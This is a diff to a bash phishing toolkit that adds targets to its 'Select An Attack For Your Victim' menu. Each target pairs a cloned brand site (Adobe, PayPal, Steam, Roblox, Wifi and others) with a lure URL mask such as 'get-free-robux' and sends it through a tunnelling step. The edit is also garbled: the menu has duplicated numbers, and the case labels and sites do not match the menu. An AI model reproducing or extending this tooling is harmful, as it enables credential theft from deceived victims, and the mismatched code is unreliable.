@@ -885,16 +885,30 @@ main_menu() {
 	cat <<- EOF
 		${RED}Select An Attack For Your Victim
 
-		${WHITE}1. Facebook		${WHITE}10. Snapchat
-		${WHITE}2. Instagram		${WHITE}11. Spotify
-		${WHITE}3. Google		${WHITE}12. Github
-		${WHITE}4. Bitcoin		${WHITE}13. Discord
-		${WHITE}5. Crypto		${WHITE}14. Roblox
-		${WHITE}6. Microsoft		${WHITE}15. Steam
-		${WHITE}7. Netflix		${WHITE}16. Playstation
-		${WHITE}8. Paypal		${WHITE}17. Xbox
-		${WHITE}9. Tiktok		${WHITE}18. Verizon
-		
+		${WHITE}1. Adobe
+		${WHITE}1. Airbnb
+		${WHITE}2. Facebook
+		${WHITE}3. Instagram
+		${WHITE}4. Google
+		${WHITE}5. Bitcoin
+		${WHITE}6. Crypto
+		${WHITE}7. Microsoft
+		${WHITE}8. Netflix
+		${WHITE}9. Paypal
+		${WHITE}10. Tiktok
+		${WHITE}11. Snapchat
+		${WHITE}12. Spotify
+		${WHITE}13. Github
+		${WHITE}14. Shopify
+		${WHITE}15. Ebay
+		${WHITE}16. Discord
+		${WHITE}17. Roblox
+		${WHITE}18. Steam
+		${WHITE}19. Playstation
+		${WHITE}20. Xbox
+		${WHITE}21. Verizon
+		${WHITE}22. Wifi
+
 		${WHITE}99. About         ${WHITE}0. Exit
 	EOF
 	
@@ -902,69 +916,98 @@ main_menu() {
 
 	case $REPLY in 
 		1 | 01)
+			website="airbnb"
+			mask=''
+			tunnel_menu;;
+		2 | 01)
+			website="adobe"
+			mask='https://get-adobe-lifetime-pro-membership-free'
+			tunnel_menu;;
+		3 | 02)
 			site_facebook;;
-		2 | 02)
+		4 | 03)
 			site_instagram;;
-		3 | 03)
+		5 | 04)
 			site_gmail;;
-		4 | 04)
+		6 | 05)
 			website="bitcoin"
 			tunnel_menu;;
-		5 | 05)
+		7 | 06)
 			website="cryptocoinsniper"
 			mask='https://get-free-cryto'
 			tunnel_menu;;
-		6 | 06)
+		8 | 07)
 			website="microsoft"
 			mask='https://unlimited-onedrive-space-for-free'
 			tunnel_menu;;
-		7 | 07)
+		9 | 08)
 			website="netflix"
 			mask='https://upgrade-your-netflix-plan-free'
 			tunnel_menu;;
-		8 | 08)
+		10)
 			website="paypal"
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		9 | 09)
+		11)
 			website="tiktok"
 			mask='https://tiktok-free-liker'
 			tunnel_menu;;
-		10)
+		12)
 			website="snapchat"
 			mask='https://view-locked-snapchat-accounts-secretly'
 			tunnel_menu;;
-		11)
+		13)
 			website="spotify"
 			mask='https://convert-your-account-to-spotify-premium'
 			tunnel_menu;;
-		12)
+		14)
 			website="github"
 			mask='https://get-1k-followers-on-github-free'
 			tunnel_menu;;
-		13)
+		15)
+			website="shopify"
+			tunnel_menu;;
+		16)
+			website="ebay"
+			mask='https://get-500-usd-free-to-your-acount'
+			tunnel_menu;;
+		17)
+			website="pinterest"
+			mask='https://get-a-premium-plan-for-pinterest-free'
+			tunnel_menu;;
+		18)
 			website="discord"
 			mask='https://get-discord-nitro-free'
 			tunnel_menu;;
-		14)
+		19)
+			website="reddit"
+			mask='https://reddit-official-verified-member-badge'
+			tunnel_menu;;
+		20)
+			website="messenger"
+			tunnel_menu;;
+		21)
 			website="roblox"
 			mask='https://get-free-robux'
 			tunnel_menu;;
-		15)
+		22)
 			website="steam"
 			mask='https://steam-500-usd-gift-card-free'
 			tunnel_menu;;
-		16)
+		23)
 			website="playstation"
 			mask='https://playstation-500-usd-gift-card-free'
 			tunnel_menu;;
-		17)
+		24)
 			website="xbox"
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		18)
+		25)
 			website="verizon"
 			mask='https://get-unlimited-data'
+			tunnel_menu;;
+		26)
+			website="wifi"
 			tunnel_menu;;
 		99)
 			about;;
